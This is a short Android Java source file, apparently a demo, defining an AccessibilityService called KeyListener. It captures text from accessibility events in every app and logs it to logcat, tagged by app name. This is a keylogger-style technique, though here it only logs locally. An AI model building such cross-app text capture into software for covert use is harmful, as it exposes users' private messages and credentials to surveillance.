package com.example.helloaccessibilityservice;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

public class KeyListener extends AccessibilityService {
    public String foregroundApp="";
    public String lastMsg="";
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        final int eventType = event.getEventType();
        String eventText = null;
        switch(eventType) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                break;
        }


        String currApp=event.getPackageName().toString();
        if((foregroundApp.equals(currApp))||foregroundApp.length()==0)
        {
            lastMsg=event.getText().toString();
            Log.d("Pre",currApp + "  :  "+lastMsg);

        }
        else
        {
            Log.d("Final ",foregroundApp+" :  "+lastMsg);

        }
        foregroundApp=currApp;
        lastMsg=event.getText().toString();
    }


    @Override
    public void onInterrupt() {

    }
}
